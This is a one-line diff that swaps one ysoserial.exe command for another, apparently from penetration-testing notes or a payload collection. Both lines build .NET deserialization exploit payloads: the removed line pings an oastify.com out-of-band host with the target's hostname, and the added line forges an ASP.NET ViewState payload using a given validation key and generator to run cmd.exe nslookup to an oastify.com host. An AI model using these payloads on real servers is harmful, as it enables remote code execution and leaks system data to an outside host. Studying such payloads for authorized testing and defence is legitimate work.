@@ -1,1 +1,1 @@
-ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "for /f %i in ('hostname') do ping %i.https://5syl8z1ojpkzxtzto25ayrks1j7av0jp.oastify.com/" -o raw
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c nslookup 1y06rcfbkb4hvjcndwxe3kcdi4ovcl0a.oastify.com.oast" --generator="4E85D818" --islegacy --validationalg="HMACSHA256" --validationkey="32B98D6305C2D163384136B7D22EABA86DD4C061A77BE71803CC486A5EBE8E739EBEA4142118A91500EC6142C815602E9876059501457009FF9ACCDB786EF7CD" --isdebug
